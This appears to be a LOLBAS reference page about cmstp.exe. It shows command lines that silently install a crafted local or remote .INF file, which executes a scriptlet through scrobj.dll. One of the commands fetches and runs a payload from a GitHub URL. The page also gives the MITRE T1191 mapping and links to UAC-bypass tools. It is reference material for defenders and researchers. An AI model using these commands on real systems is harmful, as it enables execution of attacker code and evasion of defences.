<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Cmstp</title>
</head><body>Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.<br/>
cmstp.exe /ni /s c:\cmstp\CorpVPN.inf<br/>
<br/>
<br/>
Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.<br/>
cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf<br/>
<br/>
<ul>Windows binary: True</ul>
<ul>Bypasses Default AppLocker Rules: False</ul>
<ul>Mitre: <a href="https://attack.mitre.org/wiki/Technique/T1191">T1191</a></ul>
<ul><li>Links:</li>
</ul>
<ul><li style="list-style-type: none"><ul><li><a href="https://twitter.com/NickTyrer/status/958450014111633408">https://twitter.com/NickTyrer/status/958450014111633408</a></li>
<li><a href="https://gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80">https://gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80</a></li>
<li><a href="https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e">https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e</a></li>
<li><a href="https://oddvar.moe/2017/08/15/research-on-cmstp-exe/">https://oddvar.moe/2017/08/15/research-on-cmstp-exe/</a></li>
<li><a href="https://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1">https://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1</a></li>
<li><a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></li>
</ul>
</li>
</ul>
<ul><li>File path:</li>
</ul>
<ul><li style="list-style-type: none"><ul><li>C:\Windows\system32\cmstp.exe</li>
<li>C:\Windows\sysWOW64\cmstp.exe</li>
</ul>
</li>
</ul>
<ul><li>Acknowledgement:</li>
</ul>
<ul><li style="list-style-type: none"><ul><li>Name: Oddvar Moe</li>
<li style="list-style-type: none"><ul><li>Twitter: <a href="https://twitter.com/@oddvarmoe">@oddvarmoe</a></li>
<li>Blog: <a href="https://oddvar.moe/">https://oddvar.moe</a></li>
</ul>
</li>
<li>Name: Nick Tyrer</li>
<li style="list-style-type: none"><ul><li>Twitter: <a href="https://twitter.com/@NickTyrer">@NickTyrer</a></li>
<li>Blog:</li>
</ul>
</li>
</ul>
</li>
</ul>
&nbsp;<br/>
<br/>
<br/>
</body></html>